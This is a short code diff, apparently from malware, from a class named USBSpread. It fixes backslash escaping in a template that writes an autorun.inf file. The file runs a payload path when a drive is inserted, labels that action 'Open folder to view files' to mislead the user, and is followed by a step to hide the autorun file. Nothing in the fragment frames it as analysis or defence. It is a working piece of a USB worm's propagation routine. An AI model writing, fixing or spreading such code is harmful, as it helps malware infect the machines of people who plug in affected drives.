@@ -67,8 +67,8 @@ class USBSpread:
 [AutoRun]
 open={payload_path}
 action=Open folder to view files
-shell\open\command={payload_path}
-shell\open\default=1
+shell\\open\command={payload_path}
+shell\\open\default=1
                 """)
             
             # Hide autorun
